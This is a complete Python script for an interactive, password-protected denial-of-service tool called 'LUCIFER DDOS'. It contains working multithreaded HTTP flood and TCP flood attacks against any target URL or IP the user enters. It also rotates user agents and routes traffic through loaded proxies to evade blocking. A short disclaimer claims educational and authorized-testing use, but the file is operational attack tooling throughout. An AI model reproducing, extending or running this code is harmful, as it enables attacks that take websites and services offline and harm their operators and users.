#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import threading
import random
import socket
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Configuration
DDOS_PASSWORD_HASH = "7797b4237da3248b8b85feb361ea661afc2d34f272e596197c217c9318521949"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear_screen()
    print(f"""{RED}
██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ ██████╗  ██████╗ ███████╗
██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝██║  ██║██║   ██║███████╗
██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗██║  ██║██║   ██║╚════██║
███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║██████╔╝╚██████╔╝███████║
╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
{RESET}{BLUE}
              ╔══════════════════════════════════════╗
              ║            LUCIFER DDOS             ║
              ║           [Professional Edition]    ║
              ║         Developed by Foysal         ║
              ╚══════════════════════════════════════╝
{RESET}""")

def password_prompt():
    print(f"\n{YELLOW}[!] LUCIFER DDOS is password protected.{RESET}")
    attempts = 3
    while attempts > 0:
        pw = input(f"{CYAN}[?] Enter password: {RESET}")
        entered_hash = hashlib.sha256(pw.encode()).hexdigest()
        
        if entered_hash == DDOS_PASSWORD_HASH:
            print(f"{GREEN}[+] Access Granted to LUCIFER DDOS!{RESET}")
            time.sleep(1)
            return True
        else:
            attempts -= 1
            print(f"{RED}[-] Incorrect Password! {attempts} attempts remaining{RESET}")
    
    print(f"{RED}[!] Maximum attempts reached. Exiting...{RESET}")
    return False

class DDoSTools:
    def __init__(self):
        self.attack_running = False
        self.requests_sent = 0
        self.packets_sent = 0
        self.proxies = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        ]

    def show_stats(self):
        print(f"""
{CYAN}[=== SYSTEM STATISTICS ===]{RESET}
{GREEN}• Proxies Loaded:{RESET} {len(self.proxies)}
{GREEN}• User Agents:{RESET} {len(self.user_agents)}
{GREEN}• Thread Capacity:{RESET} High
{GREEN}• Attack Methods:{RESET} HTTP Flood, TCP Flood
        """)

    def parse_proxy(self, proxy_string):
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                return {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'https://{username}:{password}@{host}:{port}'
                }
            elif len(parts) == 2:
                host, port = parts
                return {
                    'http': f'http://{host}:{port}',
                    'https': f'https://{host}:{port}'
                }
        except:
            pass
        return None

    def load_proxies(self):
        print(f"\n{CYAN}[=== PROXY MANAGEMENT ===]{RESET}")
        print(f"{YELLOW}[!] Supported formats:{RESET}")
        print(f"{YELLOW}    • host:port:username:password (with auth){RESET}")
        print(f"{YELLOW}    • host:port (without auth){RESET}")
        print(f"{YELLOW}[!] Enter 'done' when finished{RESET}")

        self.proxies = []
        proxy_count = 0
        
        while True:
            proxy_input = input(f"{CYAN}[?] Enter proxy ({proxy_count} loaded): {RESET}").strip()

            if proxy_input.lower() == 'done' or proxy_input == '':
                break

            proxy = self.parse_proxy(proxy_input)
            if proxy:
                self.proxies.append(proxy)
                proxy_count += 1
                print(f"{GREEN}[+] Proxy #{proxy_count} added successfully{RESET}")
            else:
                print(f"{RED}[-] Invalid proxy format!{RESET}")

        print(f"{GREEN}[+] Total {proxy_count} proxies loaded{RESET}")
        
        if proxy_count > 0:
            print(f"{YELLOW}[!] Testing proxies...{RESET}")
            working_proxies = self.test_proxies()
            print(f"{GREEN}[+] {working_proxies}/{proxy_count} proxies are working{RESET}")
        
        input(f"{YELLOW}Press Enter to continue...{RESET}")

    def test_proxies(self):
        working_count = 0
        print(f"{CYAN}[Testing proxies...]{RESET}")
        
        for i, proxy in enumerate(self.proxies):
            try:
                response = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=10)
                if response.status_code == 200:
                    working_count += 1
                    print(f"{GREEN}[✓] Proxy {i+1}: Working{RESET}")
                else:
                    print(f"{RED}[✗] Proxy {i+1}: Failed{RESET}")
            except:
                print(f"{RED}[✗] Proxy {i+1}: Failed{RESET}")
        
        return working_count

    def get_random_proxy(self):
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def http_flood(self, target, duration, threads_count):
        print(f"\n{CYAN}[=== HTTP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[*] Target URL:{RESET} {target}")
        print(f"{GREEN}[*] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[*] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[*] Active Proxies:{RESET} {len(self.proxies)}")
        print(f"{YELLOW}[!] Attack commencing in 5 seconds...{RESET}")
        
        for i in range(5, 0, -1):
            print(f"{YELLOW}[!] Starting in {i} seconds...{RESET}", end='\r')
            time.sleep(1)
        
        print(f"{RED}[!] ATTACK STARTED! Press Ctrl+C to stop{RESET}")

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    proxy = self.get_random_proxy()
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache',
                    }

                    if proxy:
                        response = requests.get(target, headers=headers, proxies=proxy, timeout=8)
                    else:
                        response = requests.get(target, headers=headers, timeout=8)

                    with lock:
                        self.requests_sent += 1
                    
                    if thread_id == 0:  # Only one thread updates display
                        elapsed = time.time() - start_time
                        rps = self.requests_sent / elapsed if elapsed > 0 else 0
                        print(f"{GREEN}[+] Reqs: {self.requests_sent} | RPS: {rps:.1f} | Time: {elapsed:.1f}s{RESET}", end='\r')

                except Exception as e:
                    with lock:
                        self.requests_sent += 1

        # Create and start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack progress
        try:
            while time.time() - start_time < duration:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time
        
        # Wait for threads to finish
        time.sleep(2)
        
        print(f"\n{CYAN}[=== ATTACK COMPLETED ===]{RESET}")
        print(f"{GREEN}[+] Total requests sent:{RESET} {self.requests_sent}")
        print(f"{GREEN}[+] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[+] Average RPS:{RESET} {self.requests_sent/total_time:.1f}")
        print(f"{GREEN}[+] Target impacted:{RESET} {target}")

    def tcp_flood(self, target, port, duration, threads_count, packet_size=1024):
        print(f"\n{CYAN}[=== TCP FLOOD ATTACK INITIATED ===]{RESET}")
        print(f"{GREEN}[*] Target:{RESET} {target}:{port}")
        print(f"{GREEN}[*] Duration:{RESET} {duration} seconds")
        print(f"{GREEN}[*] Threads:{RESET} {threads_count}")
        print(f"{GREEN}[*] Packet Size:{RESET} {packet_size} bytes")
        print(f"{YELLOW}[!] Attack commencing in 5 seconds...{RESET}")
        
        for i in range(5, 0, -1):
            print(f"{YELLOW}[!] Starting in {i} seconds...{RESET}", end='\r')
            time.sleep(1)
        
        print(f"{RED}[!] TCP FLOOD STARTED! Press Ctrl+C to stop{RESET}")

        self.attack_running = True
        self.packets_sent = 0
        start_time = time.time()
        lock = threading.Lock()

        def attack_thread(thread_id):
            nonlocal lock
            while self.attack_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    
                    # Send random data
                    data = os.urandom(packet_size)
                    sock.send(data)
                    sock.close()

                    with lock:
                        self.packets_sent += 1
                    
                    if thread_id == 0:  # Only one thread updates display
                        elapsed = time.time() - start_time
                        pps = self.packets_sent / elapsed if elapsed > 0 else 0
                        print(f"{GREEN}[+] Packets: {self.packets_sent} | PPS: {pps:.1f} | Time: {elapsed:.1f}s{RESET}", end='\r')

                except Exception:
                    with lock:
                        self.packets_sent += 1

        # Create and start threads
        threads = []
        for i in range(threads_count):
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        # Monitor attack progress
        try:
            while time.time() - start_time < duration:
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Attack interrupted by user{RESET}")

        self.attack_running = False
        total_time = time.time() - start_time
        
        # Wait for threads to finish
        time.sleep(2)
        
        print(f"\n{CYAN}[=== TCP FLOOD COMPLETED ===]{RESET}")
        print(f"{GREEN}[+] Total packets sent:{RESET} {self.packets_sent}")
        print(f"{GREEN}[+] Attack duration:{RESET} {total_time:.2f} seconds")
        print(f"{GREEN}[+] Average PPS:{RESET} {self.packets_sent/total_time:.1f}")
        print(f"{GREEN}[+] Target:{RESET} {target}:{port}")

    def show_menu(self):
        print(f"""
{CYAN}[=== LUCIFER DDOS MENU ===]{RESET}
{CYAN}[1]{RESET} HTTP Flood Attack
{CYAN}[2]{RESET} TCP Flood Attack  
{CYAN}[3]{RESET} Load Proxies ({len(self.proxies)} loaded)
{CYAN}[4]{RESET} System Statistics
{CYAN}[5]{RESET} About LUCIFER DDOS
{CYAN}[0]{RESET} Exit
        """)

    def about(self):
        print(f"""
{CYAN}[=== ABOUT LUCIFER DDOS ===]{RESET}
{GREEN}Version:{RESET} Professional Edition 2.0
{GREEN}Developer:{RESET} Foysal
{GREEN}Purpose:{RESET} Educational & Penetration Testing
{GREEN}Features:{RESET}
  • HTTP Flood Attack
  • TCP Flood Attack  
  • Proxy Support
  • Multi-threading
  • User Agent Rotation
{GREEN}Platforms:{RESET} Termux, Kali Linux, Windows
{YELLOW}Warning:{RESET} For authorized testing only!
{RED}Disclaimer:{RESET} Misuse of this tool is prohibited.
        """)

    def main(self):
        if not password_prompt():
            return

        while True:
            banner()
            self.show_menu()
            choice = input(f"{YELLOW}[?] Select option: {RESET}")

            if choice == '1':
                print(f"\n{CYAN}[=== HTTP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target URL (http://example.com): ").strip()
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target
                
                try:
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 50): ") or "50")
                    
                    if threads > 1000:
                        print(f"{RED}[!] Thread count too high! Using 1000 threads maximum.{RESET}")
                        threads = 1000
                    
                    self.http_flood(target, duration, threads)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '2':
                print(f"\n{CYAN}[=== TCP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target IP: ").strip()
                try:
                    port = int(input("[?] Enter target port: "))
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 50): ") or "50")
                    packet_size = int(input("[?] Enter packet size in bytes (default 1024): ") or "1024")
                    
                    if threads > 1000:
                        print(f"{RED}[!] Thread count too high! Using 1000 threads maximum.{RESET}")
                        threads = 1000
                    
                    self.tcp_flood(target, port, duration, threads, packet_size)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '3':
                self.load_proxies()

            elif choice == '4':
                self.show_stats()
                input(f"{YELLOW}Press Enter to continue...{RESET}")

            elif choice == '5':
                self.about()
                input(f"{YELLOW}Press Enter to continue...{RESET}")

            elif choice == '0':
                print(f"{GREEN}[+] Thank you for using LUCIFER DDOS!{RESET}")
                sys.exit(0)

            else:
                print(f"{RED}[-] Invalid choice!{RESET}")
                time.sleep(1)

def main():
    try:
        tools = DDoSTools()
        tools.main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program terminated by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()